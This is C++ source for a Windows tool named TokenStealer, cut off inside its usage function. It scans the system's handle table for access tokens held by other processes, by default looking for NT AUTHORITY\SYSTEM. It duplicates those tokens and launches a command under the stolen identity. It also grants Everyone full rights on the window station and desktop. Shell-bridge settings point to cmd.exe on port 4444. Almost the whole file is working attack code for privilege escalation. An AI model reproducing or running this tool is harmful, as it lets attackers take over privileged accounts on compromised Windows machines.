// TokenStealer.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <wchar.h>
#include <stdlib.h>
#include <assert.h>
#include <Psapi.h>
#include <conio.h>

#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"ws2_32.lib")
extern HANDLE hINPUT, hOUTPUT;
#define NT_SUCCESS(x) ((x) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define TOKEN_PRIMARY 1
#define TOKEN_IMPERSONATION 2
#define SystemHandleInformation 16
#define ObjectBasicInformation 0
#define ObjectNameInformation 1
#define ObjectTypeInformation 2
#pragma once
#define DESKTOP_ALL (DESKTOP_CREATEMENU      | DESKTOP_CREATEWINDOW  | \
DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL | \
DESKTOP_JOURNALPLAYBACK | DESKTOP_JOURNALRECORD | \
DESKTOP_READOBJECTS | DESKTOP_SWITCHDESKTOP |  \
DESKTOP_WRITEOBJECTS | DELETE | \
READ_CONTROL | WRITE_DAC |\
WRITE_OWNER)
#define WINSTA_ALL (WINSTA_ACCESSCLIPBOARD  | WINSTA_ACCESSGLOBALATOMS | \
WINSTA_CREATEDESKTOP | WINSTA_ENUMDESKTOPS | \
WINSTA_ENUMERATE | WINSTA_EXITWINDOWS | \
WINSTA_READATTRIBUTES | WINSTA_READSCREEN | \
WINSTA_WRITEATTRIBUTES | DELETE |\
READ_CONTROL | WRITE_DAC | \
WRITE_OWNER)
#define GENERIC_ACCESS (GENERIC_READ    | GENERIC_WRITE |GENERIC_EXECUTE | GENERIC_ALL)
void CreateProcessWithPipeComm(HANDLE token, wchar_t* command);
BOOL HasAssignPriv = FALSE;
BOOL Interactive = TRUE;
BOOL BridgeMode = FALSE;
BOOL NoBridge = FALSE;
wchar_t BridgeCommand[2048] = L"cmd.exe";
int BridgePort = 4444;
wchar_t* User_to_impersonate = NULL;
static int num = 0;
int TokenTypeNeeded = 0;
BOOL ForceImpersonation = FALSE;
BOOL ForceBridge = FALSE;
DWORD SessionId = -1;
wchar_t WinStationName[256];
wchar_t** TokenUsers = NULL; // Global ar\ray to store TokenUsers
int num_TokenUsers = 0; // Number of TokenUsers currently in the array
int max_TokenUsers = 0; // Maximum number of TokenUsers that can be stored in the array
typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);
typedef NTSTATUS(NTAPI* _NtDuplicateObject)(
	HANDLE SourceProcessHandle,
	HANDLE SourceHandle,
	HANDLE TargetProcessHandle,
	PHANDLE TargetHandle,
	ACCESS_MASK DesiredAccess,
	ULONG Attributes,
	ULONG Options
	);
typedef NTSTATUS(NTAPI* _NtQueryObject)(
	HANDLE ObjectHandle,
	ULONG ObjectInformationClass,
	PVOID ObjectInformation,
	ULONG ObjectInformationLength,
	PULONG ReturnLength
	);

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _SYSTEM_HANDLE
{
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG HandleCount;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef enum _POOL_TYPE
{
	NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed,
	DontUseThisType,
	NonPagedPoolCacheAligned,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS
} POOL_TYPE, * PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION
{
	UNICODE_STRING Name;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccess;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	USHORT MaintainTypeList;
	POOL_TYPE PoolType;
	ULONG PagedPoolUsage;
	ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG                   NextEntryOffset;
	ULONG                   NumberOfThreads;
	LARGE_INTEGER           Reserved[3];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ImageName;
	ULONG                   BasePriority;
	HANDLE                  ProcessId;
	HANDLE                  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;

PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName)
{
	return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf("[-] Could not look up privilege %ls\n", priv);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] Could not enable privilege %ls (error %lu)\n", priv, GetLastError());
		return FALSE;
	}
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		//printf("The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}
int GetTokenUser(HANDLE tok, wchar_t* SamAccount)
{
	DWORD Size, UserSize, DomainSize;
	SID* sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	//TCHAR SamAccount[128];
	TOKEN_USER* User;
	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return FALSE;

	User = (TOKEN_USER*)malloc(Size);
	assert(User);
	assert(User);
	GetTokenInformation(tok, TokenUser, User, Size, &Size);
	assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID*)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof * UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof * DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	swprintf(SamAccount, 128, L"%s\\%s", DomainName, UserName);


	return 1;
}

int TokenLevel(HANDLE token, SECURITY_IMPERSONATION_LEVEL* ImpersonationLevel)
{


	TOKEN_TYPE Type;
	DWORD returned_tokinfo_length;
	//SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
	*ImpersonationLevel = (SECURITY_IMPERSONATION_LEVEL)0;
	if (!GetTokenInformation(token, TokenType, &Type, sizeof(TOKEN_TYPE), &returned_tokinfo_length))
		return -1;
	if (Type == TokenPrimary)
	{

		return 1;
	}
	if (GetTokenInformation(token, TokenImpersonationLevel, ImpersonationLevel, sizeof(SECURITY_IMPERSONATION_LEVEL), &returned_tokinfo_length))
	{

		
		if (*ImpersonationLevel == SecurityDelegation)
		{
		
			return 2;
		}
		else
			return 2;

		
	}
	return -1;

}



int IsValidToken(HANDLE tok)
{
	DWORD Size, UserSize, DomainSize;
	SID* sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TCHAR SamAccount[128];
	TOKEN_USER* User;
	

	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return FALSE;
	//return 0;
	User = (TOKEN_USER*)malloc(Size);
	//assert(User);
	assert(User);
	GetTokenInformation(tok, TokenUser, User, Size, &Size);
	//assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID*)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);

	UserSize = (sizeof UserName / sizeof * UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof * DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);
	free(User);

	swprintf(SamAccount, 128, L"%s\\%s", DomainName, UserName);


	if (!_wcsicmp(SamAccount, User_to_impersonate))
	{

		
		return 1;
	}
	return 0;

}





int ExecuteWithToken(wchar_t* command, ULONG pid)
{
	_NtQuerySystemInformation NtQuerySystemInformation =
		(_NtQuerySystemInformation)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtQuerySystemInformation");
	_NtDuplicateObject NtDuplicateObject =
		(_NtDuplicateObject)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtDuplicateObject");
	_NtQueryObject NtQueryObject =
		(_NtQueryObject)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtQueryObject");
	NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoSize = 0x10000;

	HANDLE processHandle;
	ULONG i;
	
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	BOOL b1, b2;
	
	
	HANDLE dupHandle = NULL;
	POBJECT_TYPE_INFORMATION objectTypeInfo;
	
	
	
	HANDLE pToken1, pToken2;
	
	BOOL success = FALSE;
	int deleg = 0;
	DWORD psessid = -1;
	SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
	

	
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	if (User_to_impersonate == NULL)
		User_to_impersonate = (wchar_t*)L"NT AUTHORITY\\SYSTEM";
	if (!(processHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid)))
	{
		//printf("[-] Could not open PID %d %d!)\n", pid, GetLastError());

		return 0;
	}
	bool b = ProcessIdToSessionId(pid, &psessid);
	if (SessionId != -1)
	{

		if (!b || psessid != SessionId)
			return 0;


	}

	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(
		SystemHandleInformation,
		handleInfo,
		handleInfoSize,
		NULL
	)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	if (!NT_SUCCESS(status))
	{
		printf("NtQuerySystemInformation failed!\n");
		return 0;
	}
	success = FALSE;

	for (i = 0; i < handleInfo->HandleCount; i++)
	{
		SYSTEM_HANDLE handle = handleInfo->Handles[i];


	
		if (DuplicateHandle(processHandle, (HANDLE)handle.Handle,
			GetCurrentProcess(), &dupHandle,
			MAXIMUM_ALLOWED, FALSE, 0x02) == FALSE)
		{
			//printf("[-] Error Dup Handle!%d\n", GetLastError());

			continue;
		}


		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
		if (!NT_SUCCESS(NtQueryObject(
			dupHandle,
			ObjectTypeInformation,
			objectTypeInfo,
			0x1000,
			NULL
		)))
		{
			//printf("[-] Error NtQueryObject %d!\n",GetLastError());

			CloseHandle(dupHandle);
			continue;
		}

		if (!wcsncmp(objectTypeInfo->Name.Buffer, L"Token", objectTypeInfo->Name.Length / 2))
		{


			if (IsValidToken((HANDLE)dupHandle))
			{

				int tl = TokenLevel(dupHandle, &ImpersonationLevel);
				if (tl == -1)
					continue;
				if (TokenTypeNeeded == TOKEN_PRIMARY && tl != TOKEN_PRIMARY)
					continue;
				
				if(TokenTypeNeeded >1)
				{
					if (ImpersonationLevel != TokenTypeNeeded)
					{


						continue;
					}
				}
				if (tl == TOKEN_PRIMARY)
					printf("[+] Got %S Primary Token in pid: %d\n", User_to_impersonate, pid);
				else
					printf("[+] Got %S Impersonation Token in pid: %d with Impersonation Level: %d %s\n", User_to_impersonate, pid, ImpersonationLevel, ImpersonationLevel > 1 ? "OK" : "KO");
				if (ImpersonationLevel > SecurityIdentification || tl == TOKEN_PRIMARY)
				{
					if (!DuplicateTokenEx(dupHandle, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &pToken1))
					{
						printf("[-] Error duplicating Primary Token:%d\n", GetLastError());
						break;

					}
					if (!DuplicateTokenEx(dupHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &pToken2))
					{
						printf("[-] Error duplicating ImpersonationToken:%d\n", GetLastError());
						break;

					}



					if (HasAssignPriv && !ForceImpersonation)
					{

						printf("[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: %S\n", command);
						b1 = CreateProcessAsUserW(
							pToken1,            // client's access token
							NULL,              // file to execute
							command,     // command line
							NULL,              // pointer to process SECURITY_ATTRIBUTES
							NULL,              // pointer to thread SECURITY_ATTRIBUTES
							FALSE,             // handles are not inheritable
							0,   // creation flags
							NULL,              // pointer to new environment block
							NULL,              // name of current directory
							&si,               // pointer to STARTUPINFO structure
							&pi                // receives information about new process
						);

						//debug
						printf("[*] Result: %s %d\n", b1 ? "TRUE" : "FALSE", GetLastError());
						WaitForSingleObject(pi.hProcess, INFINITE);
						if (b1)
						{
							success = TRUE;
							break;
						}


					}
					else
					{
						printf("[*] Token does NOT have SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsWithToken() for launching: %S\n", command);

						
						//RevertToSelf();

						b2 = CreateProcessWithTokenW(pToken2,
							0,
							NULL,
							command,
							CREATE_NO_WINDOW,
							NULL,
							NULL,
							&si,
							&pi);
						//debug
						printf("[*] Result: %s (%d)\n", b2 ? "TRUE" : "FALSE", GetLastError());
						if (b2)
						{
							success = TRUE;
							break;
						}



					}
				}
			}
		}
		free(objectTypeInfo);
		CloseHandle(dupHandle);

	}

	free(handleInfo);
	CloseHandle(processHandle);

	return success;
}
int compare_strings(const void* a, const void* b) {
	return wcscmp(*(const wchar_t**)a, *(const wchar_t**)b);
}
void add_string(wchar_t* new_string) {
	// Check if the string is already in the array
	for (int i = 0; i < num_TokenUsers; i++) {
		if (wcscmp(TokenUsers[i], new_string) == 0) {
			// String is already in the array, so return without adding it again
			return;
		}
	}

	// String is not in the array, so add it to the end
	if (num_TokenUsers >= max_TokenUsers) {
		// If the array is full, double its size
		max_TokenUsers = max_TokenUsers == 0 ? 1 : max_TokenUsers * 2;
		TokenUsers = (wchar_t**)realloc(TokenUsers, max_TokenUsers * sizeof(char*));
	}
	TokenUsers[num_TokenUsers] = _wcsdup(new_string);
	num_TokenUsers++;
	qsort(TokenUsers, num_TokenUsers, sizeof(wchar_t*), compare_strings);
}
int ListTokens(ULONG pid, BOOL extended_list)
{
	_NtQuerySystemInformation NtQuerySystemInformation =
		(_NtQuerySystemInformation)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtQuerySystemInformation");
	_NtDuplicateObject NtDuplicateObject =
		(_NtDuplicateObject)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtDuplicateObject");
	_NtQueryObject NtQueryObject =
		(_NtQueryObject)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtQueryObject");
	NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoSize = 0x10000;

	HANDLE processHandle;
	ULONG i;
	
	POBJECT_TYPE_INFORMATION objectTypeInfo;
	
	
	
	BOOL success = FALSE;
	HANDLE dupHandle;
	wchar_t SamAccount[128];
	wchar_t SamAccountPid[256];
	SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
	DWORD psessid=1;

	if (!(processHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid)))
	{
			return 0;
	}
	bool b = ProcessIdToSessionId(pid, &psessid);
	if (SessionId != -1)
	{
		
		if (!b || psessid != SessionId)
			return 0;


	}


	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(
		SystemHandleInformation,
		handleInfo,
		handleInfoSize,
		NULL
	)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	if (!NT_SUCCESS(status))
	{
		printf("NtQuerySystemInformation failed!\n");
		return 0;
	}

	for (i = 0; i < handleInfo->HandleCount; i++)
	{
		SYSTEM_HANDLE handle = handleInfo->Handles[i];


		if (handle.ProcessId != pid)
			continue;

		if (DuplicateHandle(processHandle, (HANDLE)handle.Handle,
			GetCurrentProcess(), &dupHandle,
			MAXIMUM_ALLOWED, FALSE, 0x02) == FALSE)
		{
			//printf("[-] Error Dup Handle!%d\n", GetLastError());

			continue;
		}


		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
		if (!NT_SUCCESS(NtQueryObject(
			dupHandle,
			ObjectTypeInformation,
			objectTypeInfo,
			0x1000,
			NULL
		)))
		{
			//printf("[-] Error NtQueryObject %d!\n",GetLastError());

			CloseHandle(dupHandle);
			continue;
		}

		if (!wcsncmp(objectTypeInfo->Name.Buffer, L"Token", objectTypeInfo->Name.Length / 2))
		{
			if (User_to_impersonate != NULL)
			{
				if (!IsValidToken(dupHandle))
					continue;
			}
			int tl = TokenLevel(dupHandle, &ImpersonationLevel);
			
			if (tl == -1)
				continue;
			if (TokenTypeNeeded == TOKEN_PRIMARY)
			{
				if (tl != TOKEN_PRIMARY)
					continue;
				

			}
			if (TokenTypeNeeded >  TOKEN_PRIMARY)
			{
				if (ImpersonationLevel != TokenTypeNeeded)
				{


					continue;
				}
			}
			
			GetTokenUser(dupHandle, SamAccount);
			if (extended_list)
			{

					if (tl == TOKEN_PRIMARY)
						wsprintf((wchar_t*)SamAccountPid, L"%s:(P):%d:%d", (wchar_t*)SamAccount, pid,psessid);
					else
						wsprintf((wchar_t*)SamAccountPid, L"%s:%d:%d:%d", (wchar_t*)SamAccount, ImpersonationLevel, pid,psessid);
					add_string(SamAccountPid);
			}
			else
				add_string(SamAccount);

			
		}
		free(objectTypeInfo);
		CloseHandle(dupHandle);
	}

	free(handleInfo);
	CloseHandle(processHandle);

	return success;
}

DWORD GetServicePid(wchar_t* serviceName)
{
	const auto hScm = OpenSCManager(nullptr, nullptr, NULL);
	const auto hSc = OpenService(hScm, serviceName, SERVICE_QUERY_STATUS);

	SERVICE_STATUS_PROCESS ssp = {};
	DWORD bytesNeeded = 0;
	QueryServiceStatusEx(hSc, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&ssp), sizeof(ssp), &bytesNeeded);

	CloseServiceHandle(hSc);
	CloseServiceHandle(hScm);

	return ssp.dwProcessId;
}
BOOL AddTheAceWindowStation(HWINSTA hwinsta, PSID psid)
{

	ACCESS_ALLOWED_ACE* pace = NULL;
	ACL_SIZE_INFORMATION aclSizeInfo;
	BOOL                 bDaclExist;
	BOOL                 bDaclPresent;
	BOOL                 bSuccess = FALSE; // assume function will
	//fail
	DWORD                dwNewAclSize;
	DWORD                dwSidSize = 0;
	DWORD                dwSdSizeNeeded;
	PACL                 pacl;
	PACL                 pNewAcl = NULL;
	PSECURITY_DESCRIPTOR psd = NULL;
	PSECURITY_DESCRIPTOR psdNew = NULL;
	PVOID                pTempAce;
	SECURITY_INFORMATION si = DACL_SECURITY_INFORMATION;
	unsigned int         i;

	__try
	{
		if (!GetUserObjectSecurity(
			hwinsta,
			&si,
			psd,
			dwSidSize,
			&dwSdSizeNeeded
		))
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
			{
				psd = (PSECURITY_DESCRIPTOR)HeapAlloc(
					GetProcessHeap(),
					HEAP_ZERO_MEMORY,
					dwSdSizeNeeded
				);
				if (psd == NULL)
					__leave;

				psdNew = (PSECURITY_DESCRIPTOR)HeapAlloc(
					GetProcessHeap(),
					HEAP_ZERO_MEMORY,
					dwSdSizeNeeded
				);
				if (psdNew == NULL)
					__leave;

				dwSidSize = dwSdSizeNeeded;

				if (!GetUserObjectSecurity(
					hwinsta,
					&si,
					psd,
					dwSidSize,
					&dwSdSizeNeeded
				))
					__leave;
			}
			else
				__leave;

		if (!InitializeSecurityDescriptor(
			psdNew,
			SECURITY_DESCRIPTOR_REVISION
		))
			__leave;

		if (!GetSecurityDescriptorDacl(
			psd,
			&bDaclPresent,
			&pacl,
			&bDaclExist
		))
			__leave;

		ZeroMemory(&aclSizeInfo, sizeof(ACL_SIZE_INFORMATION));
		aclSizeInfo.AclBytesInUse = sizeof(ACL);
		if (pacl != NULL)
		{
			if (!GetAclInformation(
				pacl,
				(LPVOID)&aclSizeInfo,
				sizeof(ACL_SIZE_INFORMATION),
				AclSizeInformation
			))
				__leave;
		}

		dwNewAclSize = aclSizeInfo.AclBytesInUse + (2 *
			sizeof(ACCESS_ALLOWED_ACE)) + (2 * GetLengthSid(psid)) - (2 *
				sizeof(DWORD));
		pNewAcl = (PACL)HeapAlloc(
			GetProcessHeap(),
			HEAP_ZERO_MEMORY,
			dwNewAclSize
		);
		if (pNewAcl == NULL)
			__leave;

		if (!InitializeAcl(pNewAcl, dwNewAclSize, ACL_REVISION))
			__leave;

		if (bDaclPresent)
		{

			if (aclSizeInfo.AceCount)
			{
				for (i = 0; i < aclSizeInfo.AceCount; i++)
				{
					// get an ACE
					if (!GetAce(pacl, i, &pTempAce))
						__leave;

					// add the ACE to the new ACL
					if (!AddAce(
						pNewAcl,
						ACL_REVISION,
						MAXDWORD,
						pTempAce,
						((PACE_HEADER)pTempAce)->AceSize
					))
						__leave;
				}
			}
		}

		// 
		// add the first ACE to the windowstation
		// 
		pace = (ACCESS_ALLOWED_ACE*)HeapAlloc(
			GetProcessHeap(),
			HEAP_ZERO_MEMORY,
			sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(psid) -
			sizeof(DWORD
				));
		if (pace == NULL)
			__leave;

		pace->Header.AceType = ACCESS_ALLOWED_ACE_TYPE;
		pace->Header.AceFlags = CONTAINER_INHERIT_ACE |
			INHERIT_ONLY_ACE |

			OBJECT_INHERIT_ACE;
		pace->Header.AceSize = sizeof(ACCESS_ALLOWED_ACE) +

			GetLengthSid(psid) - sizeof(DWORD);
		pace->Mask = GENERIC_ACCESS;

		if (!CopySid(GetLengthSid(psid), &pace->SidStart, psid))
			__leave;

		if (!AddAce(
			pNewAcl,
			ACL_REVISION,
			MAXDWORD,
			(LPVOID)pace,
			pace->Header.AceSize
		))
			__leave;

		// 
		// add the second ACE to the windowstation
		// 
		pace->Header.AceFlags = NO_PROPAGATE_INHERIT_ACE;
		pace->Mask = WINSTA_ALL;

		if (!AddAce(
			pNewAcl,
			ACL_REVISION,
			MAXDWORD,
			(LPVOID)pace,
			pace->Header.AceSize
		))
			__leave;

		// 
		// set new dacl for the security descriptor
		// 
		if (!SetSecurityDescriptorDacl(
			psdNew,
			TRUE,
			pNewAcl,
			FALSE
		))
			__leave;

		// 
// set the new security descriptor for the windowstation
// 
		if (!SetUserObjectSecurity(hwinsta, &si, psdNew))
			__leave;

		// 
		// indicate success
		// 
		bSuccess = TRUE;
	}
	__finally
	{
		// 
		// free the allocated buffers
		// 
		if (pace != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)pace);

		if (pNewAcl != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)pNewAcl);

		if (psd != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)psd);

		if (psdNew != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)psdNew);
	}

	return bSuccess;

}

BOOL AddTheAceDesktop(HDESK hdesk, PSID psid)
{

	ACL_SIZE_INFORMATION aclSizeInfo;
	BOOL                 bDaclExist;
	BOOL                 bDaclPresent;
	BOOL                 bSuccess = FALSE; // assume function will
	// fail
	DWORD                dwNewAclSize;
	DWORD                dwSidSize = 0;
	DWORD                dwSdSizeNeeded;
	PACL                 pacl;
	PACL                 pNewAcl = NULL;
	PSECURITY_DESCRIPTOR psd = NULL;
	PSECURITY_DESCRIPTOR psdNew = NULL;
	PVOID                pTempAce;
	SECURITY_INFORMATION si = DACL_SECURITY_INFORMATION;
	unsigned int         i;

	__try
	{
		// 
		// obtain the security descriptor for the desktop object
		// 
		if (!GetUserObjectSecurity(
			hdesk,
			&si,
			psd,
			dwSidSize,
			&dwSdSizeNeeded
		))
		{
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
			{
				psd = (PSECURITY_DESCRIPTOR)HeapAlloc(
					GetProcessHeap(),
					HEAP_ZERO_MEMORY,
					dwSdSizeNeeded
				);
				if (psd == NULL)
					__leave;

				psdNew = (PSECURITY_DESCRIPTOR)HeapAlloc(
					GetProcessHeap(),
					HEAP_ZERO_MEMORY,
					dwSdSizeNeeded
				);
				if (psdNew == NULL)
					__leave;

				dwSidSize = dwSdSizeNeeded;

				if (!GetUserObjectSecurity(
					hdesk,
					&si,
					psd,
					dwSidSize,
					&dwSdSizeNeeded
				))
					__leave;
			}
			else
				__leave;
		}

		// 
		// create a new security descriptor
		// 
		if (!InitializeSecurityDescriptor(
			psdNew,
			SECURITY_DESCRIPTOR_REVISION
		))
			__leave;

		// 
		// obtain the dacl from the security descriptor
		// 
		if (!GetSecurityDescriptorDacl(
			psd,
			&bDaclPresent,
			&pacl,
			&bDaclExist
		))
			__leave;

		// 
		// initialize
		// 
		ZeroMemory(&aclSizeInfo, sizeof(ACL_SIZE_INFORMATION));
		aclSizeInfo.AclBytesInUse = sizeof(ACL);

		// 
		// call only if NULL dacl
		// 
		if (pacl != NULL)
		{
			// 
			// determine the size of the ACL info
			// 
			if (!GetAclInformation(
				pacl,
				(LPVOID)&aclSizeInfo,
				sizeof(ACL_SIZE_INFORMATION),
				AclSizeInformation
			))
				__leave;
		}

		// 
		// compute the size of the new acl
		// 
		dwNewAclSize = aclSizeInfo.AclBytesInUse +
			sizeof(ACCESS_ALLOWED_ACE) +
			GetLengthSid(psid) - sizeof(DWORD);

		// 
		// allocate buffer for the new acl
		// 
		pNewAcl = (PACL)HeapAlloc(
			GetProcessHeap(),
			HEAP_ZERO_MEMORY,
			dwNewAclSize
		);
		if (pNewAcl == NULL)
			__leave;

		// 
		// initialize the new acl
		// 
		if (!InitializeAcl(pNewAcl, dwNewAclSize, ACL_REVISION))
			__leave;

		// 
		// if DACL is present, copy it to a new DACL
		// 
		if (bDaclPresent) // only copy if DACL was present
		{
			// copy the ACEs to our new ACL
			if (aclSizeInfo.AceCount)
			{
				for (i = 0; i < aclSizeInfo.AceCount; i++)
				{
					// get an ACE
					if (!GetAce(pacl, i, &pTempAce))
						__leave;

					// add the ACE to the new ACL
					if (!AddAce(
						pNewAcl,
						ACL_REVISION,
						MAXDWORD,
						pTempAce,
						((PACE_HEADER)pTempAce)->AceSize
					))
						__leave;
				}
			}
		}

		// 
		// add ace to the dacl
		// 
		if (!AddAccessAllowedAce(
			pNewAcl,
			ACL_REVISION,
			DESKTOP_ALL,
			psid
		))
			__leave;

		// 
		// set new dacl to the new security descriptor
		// 
		if (!SetSecurityDescriptorDacl(
			psdNew,
			TRUE,
			pNewAcl,
			FALSE
		))
			__leave;

		// 
		// set the new security descriptor for the desktop object
		// 
		if (!SetUserObjectSecurity(hdesk, &si, psdNew))
			__leave;

		// 
		// indicate success
		// 
		bSuccess = TRUE;
	}
	__finally
	{
		// 
		// free buffers
		// 
		if (pNewAcl != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)pNewAcl);

		if (psd != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)psd);

		if (psdNew != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)psdNew);
	}

	return bSuccess;
}

PSID BuildEveryoneSid() {
	SID_IDENTIFIER_AUTHORITY auth = SECURITY_WORLD_SID_AUTHORITY;
	PSID pSID = NULL;
	BOOL fSuccess = AllocateAndInitializeSid(&auth, 1,
		SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSID);
	return(fSuccess ? pSID : NULL);
}
void SetWinDesktopPerms()
{
	HWINSTA hwinstaold = GetProcessWindowStation();
	DWORD lengthNeeded;
	memset(WinStationName, 0, sizeof(WinStationName));
	GetUserObjectInformationW(hwinstaold, UOI_NAME, WinStationName, 256, &lengthNeeded);



	HWINSTA hwinsta = OpenWindowStationW(WinStationName, FALSE, READ_CONTROL | WRITE_DAC);

	if (!SetProcessWindowStation(hwinsta))
		printf("[-] Error SetProcessWindowStation:%d\n", GetLastError());

	HDESK hdesk = OpenDesktop(
		L"default",
		0,
		FALSE,
		READ_CONTROL | WRITE_DAC |
		DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS
	);
	if (hdesk == NULL)
		printf("[-] Error open Desktop:%d\n", GetLastError());
	if (!SetProcessWindowStation(hwinstaold))
		printf("[-] Error SetProcessWindowStation2:%d\n", GetLastError());


	PSID psid = BuildEveryoneSid();
	
	if (!AddTheAceWindowStation(hwinstaold, psid))
		printf("[-] Error add Ace Station:%d\n", GetLastError());
	if (!AddTheAceDesktop(hdesk, psid))
		printf("[-] Error add Ace desktop:%d\n", GetLastError());
	//free(psid);
	CloseWindowStation(hwinsta);

	CloseDesktop(hdesk);
}

void usage()
{
	printf("[!] Usage: TokenStealer.exe <options>\n\n");
	printf("  Listing:\n");
